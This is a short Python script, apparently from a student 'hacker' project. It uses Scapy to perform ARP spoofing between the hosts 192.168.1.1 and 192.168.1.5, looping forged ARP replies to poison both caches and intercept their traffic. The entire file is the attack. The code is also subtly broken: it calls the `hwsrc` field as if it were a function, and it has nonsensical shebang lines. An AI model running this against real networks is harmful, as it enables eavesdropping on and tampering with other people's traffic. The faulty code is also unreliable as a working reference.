#!/usr/bin/python
#!/usr/bin/scapy.all
#!/Users/as/Documents/GitHub/final-project-hacker-5/src/scapy
#https://stackoverflow.com/questions/46602880/importerror-no-module-named-scapy-all
import os
#os.sys.path.append('/usr/local/lib/python2.7/site-packages')
print(os.sys.path)


from scapy.all import *

def get_target_mac(ip):
    arp_request = scapy.all.ARP(pdst=ip)
#    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    finalpacket = broadcast/arp_request
    answer = scapy.all.srp(finalpacket, timeout=2, verbose=False)[0]
    mac = answer[0][1].hwsrc("aa:aa:aa:aa:aa:aa")
    return(mac)

def spoof_arp(target_ip,spoofed_ip):
    mac = get_target_mac(target_ip)
    packet = scapy.all.ARP(op=2, hwdst=mac, pdst=target_ip, psrc=spoofed_ip)
    scapy.all.send(packet, verbose=False)

def main():
    try:
        while True:
            spoof_arp("192.168.1.1","192.168.1.5")
            spoof_arp("192.168.1.5","192.168.1.1")
    except KeyboardInterrupt:
        exit(0)

main()
